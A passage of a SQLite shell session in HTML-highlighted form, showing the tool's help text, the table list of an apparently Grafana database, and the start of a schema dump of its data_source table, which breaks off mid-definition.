</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>cd</span><span class=w> </span><span class=n>DIRECTORY</span><span class=w>           </span><span class=n>Change</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>working</span><span class=w> </span><span class=n>directory</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>DIRECTORY</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>changes</span><span class=w> </span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=w>         </span><span class=k>Show</span><span class=w> </span><span class=nb>number</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=n>changed</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=k>SQL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>check</span><span class=w> </span><span class=n>GLOB</span><span class=w>             </span><span class=n>Fail</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=k>output</span><span class=w> </span><span class=n>since</span><span class=w> </span><span class=p>.</span><span class=n>testcase</span><span class=w> </span><span class=n>does</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=k>match</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>clone</span><span class=w> </span><span class=n>NEWDB</span><span class=w>            </span><span class=n>Clone</span><span class=w> </span><span class=k>data</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>NEWDB</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>existing</span><span class=w> </span><span class=k>database</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>connection</span><span class=w> </span><span class=p>[</span><span class=k>close</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=o>#</span><span class=p>]</span><span class=w> </span><span class=k>Open</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>close</span><span class=w> </span><span class=n>an</span><span class=w> </span><span class=n>auxiliary</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=k>connection</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>databases</span><span class=w>              </span><span class=n>List</span><span class=w> </span><span class=k>names</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>files</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>attached</span><span class=w> </span><span class=n>databases</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>dbconfig</span><span class=w> </span><span class=o>?</span><span class=n>op</span><span class=o>?</span><span class=w> </span><span class=o>?</span><span class=n>val</span><span class=o>?</span><span class=w>    </span><span class=n>List</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>change</span><span class=w> </span><span class=n>sqlite3_db_config</span><span class=p>()</span><span class=w> </span><span class=k>options</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>dbinfo</span><span class=w> </span><span class=o>?</span><span class=n>DB</span><span class=o>?</span><span class=w>            </span><span class=k>Show</span><span class=w> </span><span class=n>status</span><span class=w> </span><span class=n>information</span><span class=w> </span><span class=n>about</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>database</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>dump</span><span class=w> </span><span class=o>?</span><span class=n>OBJECTS</span><span class=o>?</span><span class=w>         </span><span class=n>Render</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>content</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=k>SQL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>echo</span><span class=w> </span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=w>            </span><span class=n>Turn</span><span class=w> </span><span class=n>command</span><span class=w> </span><span class=n>echo</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>off</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>eqp</span><span class=w> </span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=o>|</span><span class=k>full</span><span class=o>|</span><span class=p>...</span><span class=w>    </span><span class=n>Enable</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>disable</span><span class=w> </span><span class=n>automatic</span><span class=w> </span><span class=k>EXPLAIN</span><span class=w> </span><span class=n>QUERY</span><span class=w> </span><span class=n>PLAN</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>excel</span><span class=w>                  </span><span class=n>Display</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>output</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=k>next</span><span class=w> </span><span class=n>command</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=n>spreadsheet</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>exit</span><span class=w> </span><span class=o>?</span><span class=n>CODE</span><span class=o>?</span><span class=w>            </span><span class=n>Exit</span><span class=w> </span><span class=n>this</span><span class=w> </span><span class=n>program</span><span class=w> </span><span class=k>with</span><span class=w> </span><span class=k>return</span><span class=o>-</span><span class=n>code</span><span class=w> </span><span class=n>CODE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>expert</span><span class=w>                 </span><span class=n>EXPERIMENTAL</span><span class=p>.</span><span class=w> </span><span class=n>Suggest</span><span class=w> </span><span class=n>indexes</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>queries</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>explain</span><span class=w> </span><span class=o>?</span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=o>|</span><span class=n>auto</span><span class=o>?</span><span class=w>  </span><span class=n>Change</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>EXPLAIN</span><span class=w> </span><span class=n>formatting</span><span class=w> </span><span class=k>mode</span><span class=p>.</span><span class=w> </span><span class=k>Default</span><span class=p>:</span><span class=w> </span><span class=n>auto</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>filectrl</span><span class=w> </span><span class=n>CMD</span><span class=w> </span><span class=p>...</span><span class=w>       </span><span class=n>Run</span><span class=w> </span><span class=n>various</span><span class=w> </span><span class=n>sqlite3_file_control</span><span class=p>()</span><span class=w> </span><span class=n>operations</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>fullschema</span><span class=w> </span><span class=o>?</span><span class=c1>--indent?  Show schema and the content of sqlite_stat tables
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>.</span><span class=n>headers</span><span class=w> </span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=w>         </span><span class=n>Turn</span><span class=w> </span><span class=n>display</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>headers</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>off</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>help</span><span class=w> </span><span class=o>?-</span><span class=k>all</span><span class=o>?</span><span class=w> </span><span class=o>?</span><span class=n>PATTERN</span><span class=o>?</span><span class=w>  </span><span class=k>Show</span><span class=w> </span><span class=n>help</span><span class=w> </span><span class=nb>text</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>PATTERN</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>import</span><span class=w> </span><span class=n>FILE</span><span class=w> </span><span class=k>TABLE</span><span class=w>      </span><span class=n>Import</span><span class=w> </span><span class=k>data</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>FILE</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=k>TABLE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>imposter</span><span class=w> </span><span class=k>INDEX</span><span class=w> </span><span class=k>TABLE</span><span class=w>   </span><span class=k>Create</span><span class=w> </span><span class=n>imposter</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=k>index</span><span class=w> </span><span class=k>INDEX</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>indexes</span><span class=w> </span><span class=o>?</span><span class=k>TABLE</span><span class=o>?</span><span class=w>        </span><span class=k>Show</span><span class=w> </span><span class=k>names</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>indexes</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>limit</span><span class=w> </span><span class=o>?</span><span class=k>LIMIT</span><span class=o>?</span><span class=w> </span><span class=o>?</span><span class=n>VAL</span><span class=o>?</span><span class=w>    </span><span class=n>Display</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>change</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>an</span><span class=w> </span><span class=n>SQLITE_LIMIT</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>lint</span><span class=w> </span><span class=k>OPTIONS</span><span class=w>           </span><span class=n>Report</span><span class=w> </span><span class=n>potential</span><span class=w> </span><span class=k>schema</span><span class=w> </span><span class=n>issues</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>load</span><span class=w> </span><span class=n>FILE</span><span class=w> </span><span class=o>?</span><span class=n>ENTRY</span><span class=o>?</span><span class=w>      </span><span class=k>Load</span><span class=w> </span><span class=n>an</span><span class=w> </span><span class=n>extension</span><span class=w> </span><span class=n>library</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>log</span><span class=w> </span><span class=n>FILE</span><span class=o>|</span><span class=k>off</span><span class=w>           </span><span class=n>Turn</span><span class=w> </span><span class=n>logging</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>off</span><span class=p>.</span><span class=w> </span><span class=n>FILE</span><span class=w> </span><span class=n>can</span><span class=w> </span><span class=n>be</span><span class=w> </span><span class=n>stderr</span><span class=o>/</span><span class=k>stdout</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>mode</span><span class=w> </span><span class=k>MODE</span><span class=w> </span><span class=o>?</span><span class=k>OPTIONS</span><span class=o>?</span><span class=w>    </span><span class=k>Set</span><span class=w> </span><span class=k>output</span><span class=w> </span><span class=k>mode</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>nonce</span><span class=w> </span><span class=n>STRING</span><span class=w>           </span><span class=n>Suspend</span><span class=w> </span><span class=n>safe</span><span class=w> </span><span class=k>mode</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>one</span><span class=w> </span><span class=n>command</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=n>nonce</span><span class=w> </span><span class=n>matches</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>nullvalue</span><span class=w> </span><span class=n>STRING</span><span class=w>       </span><span class=n>Use</span><span class=w> </span><span class=n>STRING</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=n>place</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=k>NULL</span><span class=w> </span><span class=k>values</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>once</span><span class=w> </span><span class=o>?</span><span class=k>OPTIONS</span><span class=o>?</span><span class=w> </span><span class=o>?</span><span class=n>FILE</span><span class=o>?</span><span class=w>  </span><span class=k>Output</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>next</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>command</span><span class=w> </span><span class=k>only</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>FILE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>open</span><span class=w> </span><span class=o>?</span><span class=k>OPTIONS</span><span class=o>?</span><span class=w> </span><span class=o>?</span><span class=n>FILE</span><span class=o>?</span><span class=w>  </span><span class=k>Close</span><span class=w> </span><span class=k>existing</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>reopen</span><span class=w> </span><span class=n>FILE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>output</span><span class=w> </span><span class=o>?</span><span class=n>FILE</span><span class=o>?</span><span class=w>          </span><span class=n>Send</span><span class=w> </span><span class=k>output</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>FILE</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>stdout</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=n>FILE</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=n>omitted</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>parameter</span><span class=w> </span><span class=n>CMD</span><span class=w> </span><span class=p>...</span><span class=w>      </span><span class=n>Manage</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=k>parameter</span><span class=w> </span><span class=n>bindings</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>print</span><span class=w> </span><span class=n>STRING</span><span class=p>...</span><span class=w>        </span><span class=n>Print</span><span class=w> </span><span class=n>literal</span><span class=w> </span><span class=n>STRING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>progress</span><span class=w> </span><span class=n>N</span><span class=w>             </span><span class=n>Invoke</span><span class=w> </span><span class=n>progress</span><span class=w> </span><span class=k>handler</span><span class=w> </span><span class=k>after</span><span class=w> </span><span class=k>every</span><span class=w> </span><span class=n>N</span><span class=w> </span><span class=n>opcodes</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>prompt</span><span class=w> </span><span class=n>MAIN</span><span class=w> </span><span class=k>CONTINUE</span><span class=w>   </span><span class=k>Replace</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>standard</span><span class=w> </span><span class=n>prompts</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>quit</span><span class=w>                   </span><span class=n>Exit</span><span class=w> </span><span class=n>this</span><span class=w> </span><span class=n>program</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>read</span><span class=w> </span><span class=n>FILE</span><span class=w>              </span><span class=k>Read</span><span class=w> </span><span class=k>input</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>FILE</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>command</span><span class=w> </span><span class=k>output</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>recover</span><span class=w>                </span><span class=n>Recover</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>much</span><span class=w> </span><span class=k>data</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>possible</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>corrupt</span><span class=w> </span><span class=n>db</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>restore</span><span class=w> </span><span class=o>?</span><span class=n>DB</span><span class=o>?</span><span class=w> </span><span class=n>FILE</span><span class=w>      </span><span class=n>Restore</span><span class=w> </span><span class=n>content</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>DB</span><span class=w> </span><span class=p>(</span><span class=k>default</span><span class=w> </span><span class=s2>&#34;main&#34;</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>FILE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>save</span><span class=w> </span><span class=o>?</span><span class=k>OPTIONS</span><span class=o>?</span><span class=w> </span><span class=n>FILE</span><span class=w>    </span><span class=k>Write</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>FILE</span><span class=w> </span><span class=p>(</span><span class=n>an</span><span class=w> </span><span class=k>alias</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=p>.</span><span class=n>backup</span><span class=w> </span><span class=p>...)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>scanstats</span><span class=w> </span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=w>       </span><span class=n>Turn</span><span class=w> </span><span class=n>sqlite3_stmt_scanstatus</span><span class=p>()</span><span class=w> </span><span class=n>metrics</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>off</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>schema</span><span class=w> </span><span class=o>?</span><span class=n>PATTERN</span><span class=o>?</span><span class=w>       </span><span class=k>Show</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>CREATE</span><span class=w> </span><span class=n>statements</span><span class=w> </span><span class=n>matching</span><span class=w> </span><span class=n>PATTERN</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>selftest</span><span class=w> </span><span class=o>?</span><span class=k>OPTIONS</span><span class=o>?</span><span class=w>     </span><span class=n>Run</span><span class=w> </span><span class=n>tests</span><span class=w> </span><span class=k>defined</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>SELFTEST</span><span class=w> </span><span class=k>table</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>separator</span><span class=w> </span><span class=n>COL</span><span class=w> </span><span class=o>?</span><span class=k>ROW</span><span class=o>?</span><span class=w>    </span><span class=n>Change</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=n>separators</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>sha3sum</span><span class=w> </span><span class=p>...</span><span class=w>            </span><span class=n>Compute</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>SHA3</span><span class=w> </span><span class=n>hash</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>content</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>shell</span><span class=w> </span><span class=n>CMD</span><span class=w> </span><span class=n>ARGS</span><span class=p>...</span><span class=w>      </span><span class=n>Run</span><span class=w> </span><span class=n>CMD</span><span class=w> </span><span class=n>ARGS</span><span class=p>...</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>system</span><span class=w> </span><span class=n>shell</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>show</span><span class=w>                   </span><span class=k>Show</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=k>current</span><span class=w> </span><span class=k>values</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>various</span><span class=w> </span><span class=n>settings</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>stats</span><span class=w> </span><span class=o>?</span><span class=n>ARG</span><span class=o>?</span><span class=w>            </span><span class=k>Show</span><span class=w> </span><span class=n>stats</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>turn</span><span class=w> </span><span class=n>stats</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>off</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=k>system</span><span class=w> </span><span class=n>CMD</span><span class=w> </span><span class=n>ARGS</span><span class=p>...</span><span class=w>     </span><span class=n>Run</span><span class=w> </span><span class=n>CMD</span><span class=w> </span><span class=n>ARGS</span><span class=p>...</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>system</span><span class=w> </span><span class=n>shell</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=o>?</span><span class=k>TABLE</span><span class=o>?</span><span class=w>         </span><span class=n>List</span><span class=w> </span><span class=k>names</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>tables</span><span class=w> </span><span class=n>matching</span><span class=w> </span><span class=k>LIKE</span><span class=w> </span><span class=n>pattern</span><span class=w> </span><span class=k>TABLE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>testcase</span><span class=w> </span><span class=n>NAME</span><span class=w>          </span><span class=k>Begin</span><span class=w> </span><span class=n>redirecting</span><span class=w> </span><span class=k>output</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=s1>&#39;testcase-out.txt&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>testctrl</span><span class=w> </span><span class=n>CMD</span><span class=w> </span><span class=p>...</span><span class=w>       </span><span class=n>Run</span><span class=w> </span><span class=n>various</span><span class=w> </span><span class=n>sqlite3_test_control</span><span class=p>()</span><span class=w> </span><span class=n>operations</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>timeout</span><span class=w> </span><span class=n>MS</span><span class=w>             </span><span class=n>Try</span><span class=w> </span><span class=n>opening</span><span class=w> </span><span class=n>locked</span><span class=w> </span><span class=n>tables</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>MS</span><span class=w> </span><span class=n>milliseconds</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>timer</span><span class=w> </span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=w>           </span><span class=n>Turn</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>timer</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>off</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>trace</span><span class=w> </span><span class=o>?</span><span class=k>OPTIONS</span><span class=o>?</span><span class=w>        </span><span class=k>Output</span><span class=w> </span><span class=k>each</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=k>statement</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>it</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=n>run</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>vfsinfo</span><span class=w> </span><span class=o>?</span><span class=n>AUX</span><span class=o>?</span><span class=w>          </span><span class=n>Information</span><span class=w> </span><span class=n>about</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>top</span><span class=o>-</span><span class=k>level</span><span class=w> </span><span class=n>VFS</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>vfslist</span><span class=w>                </span><span class=n>List</span><span class=w> </span><span class=k>all</span><span class=w> </span><span class=n>available</span><span class=w> </span><span class=n>VFSes</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>vfsname</span><span class=w> </span><span class=o>?</span><span class=n>AUX</span><span class=o>?</span><span class=w>          </span><span class=n>Print</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>VFS</span><span class=w> </span><span class=n>stack</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>width</span><span class=w> </span><span class=n>NUM1</span><span class=w> </span><span class=n>NUM2</span><span class=w> </span><span class=p>...</span><span class=w>    </span><span class=k>Set</span><span class=w> </span><span class=n>minimum</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>widths</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>columnar</span><span class=w> </span><span class=k>output</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sqlite</span><span class=o>&gt;</span><span class=w> </span><span class=p>.</span><span class=n>tables</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>alert</span><span class=w>                      </span><span class=n>login_attempt</span><span class=w>            
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>alert_configuration</span><span class=w>        </span><span class=n>migration_log</span><span class=w>            
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>alert_instance</span><span class=w>             </span><span class=n>ngalert_configuration</span><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>alert_notification</span><span class=w>         </span><span class=n>org</span><span class=w>                      
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>alert_notification_state</span><span class=w>   </span><span class=n>org_user</span><span class=w>                 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>alert_rule</span><span class=w>                 </span><span class=n>playlist</span><span class=w>                 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>alert_rule_tag</span><span class=w>             </span><span class=n>playlist_item</span><span class=w>            
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>alert_rule_version</span><span class=w>         </span><span class=n>plugin_setting</span><span class=w>           
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>annotation</span><span class=w>                 </span><span class=n>preferences</span><span class=w>              
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>annotation_tag</span><span class=w>             </span><span class=n>quota</span><span class=w>                    
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>api_key</span><span class=w>                    </span><span class=n>server_lock</span><span class=w>              
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>cache_data</span><span class=w>                 </span><span class=k>session</span><span class=w>                  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dashboard</span><span class=w>                  </span><span class=n>short_url</span><span class=w>                
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dashboard_acl</span><span class=w>              </span><span class=n>star</span><span class=w>                     
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dashboard_provisioning</span><span class=w>     </span><span class=n>tag</span><span class=w>                      
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dashboard_snapshot</span><span class=w>         </span><span class=n>team</span><span class=w>                     
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dashboard_tag</span><span class=w>              </span><span class=n>team_member</span><span class=w>              
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dashboard_version</span><span class=w>          </span><span class=n>temp_user</span><span class=w>                
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>data_source</span><span class=w>                </span><span class=n>test_data</span><span class=w>                
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>kv_store</span><span class=w>                   </span><span class=k>user</span><span class=w>                     
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>library_element</span><span class=w>            </span><span class=n>user_auth</span><span class=w>                
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>library_element_connection</span><span class=w> </span><span class=n>user_auth_token</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sqlite</span><span class=o>&gt;</span><span class=w> </span><span class=p>.</span><span class=n>dump</span><span class=w> </span><span class=n>data_source</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>PRAGMA</span><span class=w> </span><span class=n>foreign_keys</span><span class=o>=</span><span class=k>OFF</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>BEGIN</span><span class=w> </span><span class=k>TRANSACTION</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=o>`</span><span class=n>data_source</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>`</span><span class=n>id</span><span class=o>`</span><span class=w> </span><span class=nb>INTEGER</span><span class=w> </span><span class=k>PRIMARY</span><span class=w> </span><span class=k>KEY</span><span class=w> </span><span class=n>AUTOINCREMENT</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>org_id</span><span class=o>`</span><span class=w> </span><span class=nb>INTEGER</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=k>version</span><span class=o>`</span><span class=w> </span><span class=nb>INTEGER</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=k>type</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>name</span><span class=o>`</span><span class=w> </span><span class=nb>TEXT</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
